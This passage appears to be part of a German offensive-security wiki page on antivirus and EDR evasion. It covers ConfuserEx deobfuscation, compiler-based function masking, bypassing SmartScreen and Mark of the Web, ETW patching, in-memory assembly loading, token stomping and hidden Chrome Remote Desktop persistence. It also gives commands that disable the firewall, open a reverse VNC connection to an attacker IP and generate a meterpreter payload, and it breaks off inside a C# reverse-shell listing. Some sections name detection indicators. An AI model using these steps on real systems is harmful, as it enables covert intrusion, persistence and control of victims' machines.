1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenkörper* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme angepasst, sodass jede Änderung zum Absturz der Binary führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen unpacker nützlich sein können.

2.  Symbol- / Kontrollfluss-Wiederherstellung – gib die *saubere* Datei an **de4dot-cex** weiter (einen auf ConfuserEx ausgelegten Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx-2-Profil auswählen
     • de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen- und Variablennamen wieder her und entschlüsselt konstante Zeichenfolgen.

3.  Entfernen von Proxy-Aufrufen – ConfuserEx ersetzt direkte Methodenaufrufe durch leichtgewichtige Wrapper (auch *Proxy-Aufrufe* genannt), um die Dekompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt solltest du normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei unter dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *echte* payload zu finden. Oft speichert die Malware es als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Diese Kette stellt den Ausführungsfluss wieder her, **ohne** das bösartige sample ausführen zu müssen – nützlich bei der Arbeit an einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um samples automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz für erhöhte Softwaresicherheit sorgt.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie sich die Sprache `C++11/14` nutzen lässt, um zur Compile-Zeit obfuskierten Code zu erzeugen, ohne externe Tools zu verwenden oder den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogrammierungsframework generiert werden und es der Person, die die Anwendung knacken möchte, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphe Code-Engine für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework für granulare Code-Obfuscation in von LLVM unterstützten Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Ebene, indem reguläre Instruktionen in ROP-Chains umgewandelt werden. Dadurch wird unsere natürliche Vorstellung eines normalen Kontrollflusses untergraben.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

### LLVM-Compiler-gestütztes Self-Masking pro Funktion

Statt ein gesamtes Implantat nur während des Ruhezustands zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen immer dann XOR-maskiert halten, wenn sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Entry-/Exit-Stubs um den finalen Maschinencode ein und gibt einen gemeinsamen Masking-Handler in `.text` aus. Signaturen auf Source-Ebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-Kontrollfluss-Transformation

Diese Transformation sollte nach der Instruktionsauswahl und Optimierung erfolgen, da sie **jeden ausgegebenen Return** abdecken und das exakte x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Codeausgabe sucht die letzte `MachineInstr::isReturn()`, löscht sie, sodass der letzte Pfad in das angehängte Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Behalte alle vom Compiler erzeugten Stack-/Frame-Abbauinstruktionen vor jedem Return bei; leite nur die Return-Instruktion selbst um.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die per-Funktion-Stubs aus, während `emitEndOfAsmFile()` den Handler ausgibt. Zwischen den Ausgabestufen gemeinsam genutzte Symbole ermöglichen es einem Prolog-Branch, auf sein später ausgegebenes Epilog zu verweisen. Für ein manuell ausgegebenes near-`je` schreibe `0F 84`, gefolgt vom vier Byte langen MC-Ausdruck `target - address_after_je`. Aufrufe und Sprünge zum Handler können stattdessen als `MCInst`-Objekte (`CALL64pcrel32` und `JMP_1`) ausgegeben werden. Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt auf diesem Pfad fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Initialisierung vor dem CRT

Der PoC legt einen XOR-Schlüssel und 16 Byte lange Datensätze in `.funcmeta` ab, die einen vom Loader relozierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler an Offset `+8` des Datensatzes auf ein QWORD zu. Dadurch liest er die Länge samt Padding ein und rückt Datensätze um `0x10` weiter. PE-Abschnittsnamen sind nur acht Byte lang, daher sieht die Laufzeitabfrage `.funcmet`. Ein externer Patcher fügt einen ausführbaren Abschnitt `.stub` hinzu, speichert die RVA des ursprünglichen Einstiegspunkts im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub ermittelt die Image-Basis über `gs:[0x60]` → `[PEB+0x10]`, durchläuft die PE32+-Imports, um eine bereits importierte `VirtualProtect`-Funktion aufzulösen, und wird vor dem CRT ausgeführt.<sup>[[38]](#references)[[39]](#references)</sup>

Die Initialisierung setzt einen Sentinel in `gs:[0xE8]` und ruft jede Funktion aus den Metadaten auf. Ihr dauerhaft lesbarer Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unmaskierten Body. Das Epilog verwendet dann `call handler`. Nachdem der Handler 13 Register (`0x68` Byte) gesichert hat, ist die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion. Daher kann `end - start` in den zugehörigen Metadatensatz geschrieben werden. Nachdem alle Bodies maskiert wurden, löscht der Stub den Sentinel und springt zu `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Body zu dekodieren. Der letzte Pfad fällt in das angehängte Epilog, während jeder frühere Return direkt zum gemeinsamen Handler springt. Auch das normale Epilog verwendet `jmp handler` statt `call`. Nach dem erneuten Maskieren verbraucht das `ret` des Handlers somit die Rücksprungadresse des ursprünglichen Aufrufers und erhält den Funktionsergebniswert in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler sucht den aktuellen Datensatz, überspringt den festen sichtbaren Prolog (in diesem Build `0x46` Byte), ändert die Seitenschutzrechte des restlichen Bereichs zu `PAGE_EXECUTE_READWRITE`, führt Byte für Byte ein XOR mit dem niederwertigen Schlüsselbyte aus und setzt die Rechte anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife dekodiert daher beim Eintritt und kodiert bei jedem normalen Beenden.<sup>[[38]](#references)[[39]](#references)</sup>

Zu den aussagekräftigen Indikatoren für dieses Design gehören:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Einstiegspunkt innerhalb eines ausführbaren `.stub`-Abschnitts und ein `.funcmet`-Abschnitt mit einem Schlüssel sowie relozierten `.text`-Zeigern;
- PEB-, Importtabellen- und Abschnittstabellen-Parsing vor dem CRT, gefolgt von Aufrufen über jeden Metadatenzeiger;
- identische `call`/`pop`-PIC-Prologe und zahlreiche Return-Stellen, die zu einem Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen auf imagebasierte ausführbare Seiten.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält weiterhin den ursprünglichen Klartext-Body, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion dumpen. Das Ein-Byte-XOR, die lesbaren Metadaten und die feste Grenze `0x46` machen auch eine Offline-Wiederherstellung unkompliziert.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadlokal, die modifizierten Code-Seiten hingegen prozessweit. Gleichzeitiger oder rekursiver Eintritt kann daher Instruktionen erneut umschalten, während ein anderer Aufruf sie gerade ausführt. Ausnahmen und nichtlokale Abbrüche können das erneute Maskieren ebenfalls umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den tatsächlich über `lpflOldProtect` zurückgegebenen Schutz wiederherstellen, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf x64-Stack-Alignment prüfen und nach dem Umschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft macht den Aufrufer ausdrücklich für die Konsistenz des Instruktionscaches verantwortlich, wenn ausführbarer Code geändert wird.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vielleicht ist dir dieser Bildschirm schon einmal begegnet, wenn du ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich reputationsbasiert. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen und so den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei lässt sich jedoch weiterhin über „More Info“ -> „Run anyway“ ausführen).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS einer aus dem Internet heruntergeladenen Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig ist, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, zu verhindern, dass deine Payloads den Mark of The Web erhalten, besteht darin, sie in einem Container wie einer ISO-Datei zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mithilfe von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ihn jedoch auch verwenden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, lässt sich auch die Funktion **`EtwEventWrite`** des User-Space-Prozesses so ändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, damit sie sofort zurückkehrt und so das ETW-Logging für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#-Binärdateien im Speicher zu laden, ist schon seit geraumer Zeit bekannt und weiterhin eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Methoden:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, dein bösartiger Post-Exploitation-Code in diesen neuen Prozess injiziert, ausgeführt und anschließend der neue Prozess beendet. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet, dass die **Chance deutlich größer ist**, dass unser **Implant überlebt**, falls bei unserer Post-Exploitation-Aktion etwas schiefgeht oder sie entdeckt wird. Der Nachteil ist, dass die **Chance größer ist**, von **Behavioural Detections** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. So kannst du vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen. Der Nachteil ist jedoch, dass die **Chance deutlich größer ist**, deinen **Beacon zu verlieren**, wenn bei der Ausführung deiner Payload etwas schiefgeht, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sieh dir den zugehörigen InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## NativeAOT-WebAssembly-Neuverpackung von .NET-Tools (WasmForge)

Normale `execute-assembly`-Techniken behalten erkennbares MSIL bei und initialisieren schließlich eine CLR. **WasmForge** ändert stattdessen die Ausführungsumgebung: Es migriert ein C#-Projekt auf das experimentelle NativeAOT-LLVM-WASI-Ziel, kompiliert es vorab zu WebAssembly und bettet dieses Modul in einen Windows-PE-Host auf Basis von Wazero ein. Der resultierende Prozess benötigt weder die CLR des Ziels noch JIT oder `dotnet`-Host. Regeln, die ausschließlich auf verwalteten Assembly-Namen, dem Laden der CLR, AMSI oder .NET ETW basieren, erhalten daher keinen direkten Einblick mehr. Dies ist eine Umgehungs-/Verpackungstechnik und kein Umgehen einer Berechtigungsgrenze – der Gastprozess behält die Berechtigungen und das beobachtbare OS-Verhalten des ursprünglichen Tools bei.<sup>[[44]](#references)[[45]](#references)</sup>

### Ein C#-Projekt erstellen

Der empfohlene Build-Weg ist die Docker-Umgebung des Projekts, da sie das .NET 10 SDK, den NativeAOT-LLVM-Workload, WASI SDK 24.0, den Linker und die Abhängigkeiten zum Signieren enthält. Eine `.csproj`-Datei wird automatisch erkannt; der Build in einem Schritt übernimmt Migration, Kompatibilitäts-Patching, WASM-Kompilierung, PE-Forging und Signierung.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Zur Fehlersuche oder Überprüfung des generierten Codes lässt sich der Prozess in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` und abschließend `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` aufteilen. Das Build-Image verwendet außerdem einen `wasm-component-ld`-Wrapper, um die WASI-Preview-2-Komponentenkodierung zu umgehen und das einfache Modul zu erzeugen, das die eingebettete Runtime erwartet.<sup>[[44]](#references)[[45]](#references)</sup>

### Verbindung von wasm32 C# mit x64 Win32

Dies ist keine transparente Neukompilierung. NativeAOT-WASI unterstützt Windows-orientierte BCL-Funktionen nicht oder verändert sie, und ein wasm32-Gast reserviert normalerweise vier Byte große Zeigerslots, während x64-APIs acht Byte große Zeiger zurückgeben können. WasmForge begegnet beiden Problemen mit den folgenden generierten Schichten:<sup>[[44]](#references)</sup>

1. Ein Source-Patcher behebt AOT-spezifische semantische Unterschiede und leitet nicht unterstützte Aufrufe für Registry, Pipes, WMI, Identität, Verzeichnisdienste, Dateiversionen, LSA und Ähnliches an `Wf*`-Helper weiter.
2. Ein P/Invoke-Scanner erzeugt NativeAOT-`DirectPInvoke`-Mappings, sodass `[DllImport]`-Aufrufe an gelinkte C-Bridge-Symbole gebunden werden, statt die deklarierte DLL dynamisch im Gast zu laden.
3. Hostgebundene Zeiger verwenden `ulong` in C# und `uint64_t` in C. Ein generischer Dispatcher leitet den Aufruf an den Win32-Handler des Hosts weiter; eine `out8_mask` kennzeichnet echte acht Byte große Ausgabeslots, deren obere Hälften erhalten bleiben müssen. Bei nicht markierten Ausgaben im wasm32-Format schützt Snapshot/Restore vor Beschädigungen der benachbarten vier Byte durch einen Schreibvorgang von x64.
4. Dedizierte Host-Bridges verarbeiten Vorgänge, die nicht in die generische Syscall-Dispatch passen, etwa den Zugriff auf den LSA-Ticket-Cache, Kerberos-/BCrypt-Operationen mit strukturierten Ergebnissen, TCP-KDC-Datenverkehr und LDAP-Abfragen.

Ein Wrapper für `version.dll!VerQueryValueW` übergibt beispielsweise vier Host-Adressen und setzt die Bits 2 und 3 (`0xC`), da der Wertzeiger und die Länge acht Byte große Ausgabeslots sind. Der Wrapper selbst bleibt generisch und übergibt DLL-Namen, Exportnamen, Argumente und Maske an `wf_call_v2`; der Host übersetzt die Zeiger und ruft die native API auf.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Einschränkungen und Erkennungspunkte

Code mit intensiver Reflection-Nutzung, dynamisches Laden von Assemblies, beliebige native Callbacks und komplexe x64-Strukturen, die in den WASM-Speicher zurückgegeben werden, können weiterhin Patches für einzelne Tools erfordern oder vollständig fehlschlagen. Generische WASI-Preview-2-Sockets können außerdem No-op-Stubs aufrufen, weshalb unterstützte Tools protokollspezifische Host-Shims verwenden. Überprüfe jeden Befehl anhand eines nativen Builds, statt Feature-Parität vorauszusetzen.<sup>[[44]](#references)[[45]](#references)</sup>

Die Technik verlagert Telemetrie, statt das Payload unsichtbar zu machen. Die Erkennung kann sich auf eine PE-Datei konzentrieren, die ein WASM-Modul enthält oder materialisiert, auf Wazero-ähnliches Laufzeitverhalten, ungewöhnliche Zuweisungen und Kopiervorgänge von Host-/Guest-Speicher, generischen direkten Win32-Aufruf, Anomalien bei Signaturen und PE-Ressourcen sowie auf die daraus resultierenden API-Aufrufe und den Netzwerkverkehr. Das Fehlen von CLR-Load-, AMSI- oder .NET-ETW-Ereignissen sollte daher nicht als Beleg dafür gelten, dass ein Prozess harmlos ist.<sup>[[44]](#references)</sup>

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, lässt sich bösartiger Code mit anderen Sprachen ausführen, indem man dem kompromittierten Rechner Zugriff **auf die Interpreter-Umgebung gewährt, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Indem du Zugriff auf die Interpreter-Binärdateien und die Umgebung auf der SMB-Freigabe gewährst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Rechners ausführen.

Das Repository weist darauf hin: Defender scannt weiterhin die Skripte, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## WebAssembly-Rehosting zur Umgehung statischer Analyse

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token Stomping manipuliert das Access Token eines Sicherheitsprodukts wie EDR oder AV. Werden die Berechtigungen des Tokens eingeschränkt, kann der Prozess weiterlaufen, während er daran gehindert wird, privilegierte Prüfungs- oder Abhilfemaßnahmen durchzuführen.

Um dies zu verhindern, könnte Windows **externen Prozessen** den Zugriff auf die Tokens von Sicherheitsprozessen verwehren.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, kann man Chrome Remote Desktop einfach auf dem PC eines Opfers bereitstellen und anschließend verwenden, um die Kontrolle darüber zu übernehmen und Persistenz einzurichten:<sup>[[35]](#references)</sup>
1. Lade die Software von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm auf dem Opferrechner im Hintergrund aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Next“. Der Assistent fordert dich dann zur Autorisierung auf; klicke auf „Authorize“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN fest, ohne die GUI zu verwenden).
 

## Erweiterte Umgehungstechniken

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Umgehung ist ein sehr komplexes Thema. Manchmal muss man die vielen unterschiedlichen Telemetriequellen eines einzelnen Systems berücksichtigen, sodass es in ausgereiften Umgebungen praktisch unmöglich ist, vollständig unentdeckt zu bleiben.

Jede Umgebung, in der du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Umgehungstechniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ältere Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binärdatei**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und gibt diesen Teil aus.\
Ein weiteres Tool, das **dasselbe macht, ist** [**avred**](https://github.com/dobin/avred). Es bietet den Dienst auch über eine offene Website unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) an.

### **Telnet-Server**

Bis Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den du (als Administrator) wie folgt installieren konntest:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Lassen Sie es beim Systemstart **starten** und **führen** Sie es jetzt **aus**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern** (Stealth) und Firewall deaktivieren:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es hier herunter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die bin-Downloads, nicht das Setup)

**AM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Opfercomputer**

#### **Reverse-Verbindung**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit sie bereit ist, eine eingehende Reverse-**VNC-Verbindung** anzunehmen. Führe dann auf dem **Opfercomputer** den winvnc-Daemon `winvnc.exe -run` aus und starte `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNUNG:** Um unauffällig zu bleiben, darfst du Folgendes nicht tun:

- Starte `winvnc` nicht, wenn es bereits läuft, sonst wird ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird das [Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet.
- Führe nicht `winvnc -h` aus, um Hilfe aufzurufen, sonst wird ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst.

### GreatSCT

Lade es hier herunter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Innerhalb von GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starten Sie nun **den Listener** mit `msfconsole -r file.rc` und **führen Sie** die **XML-Payload** mit Folgendem aus:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unsere eigene Reverse Shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C#-Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwende es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
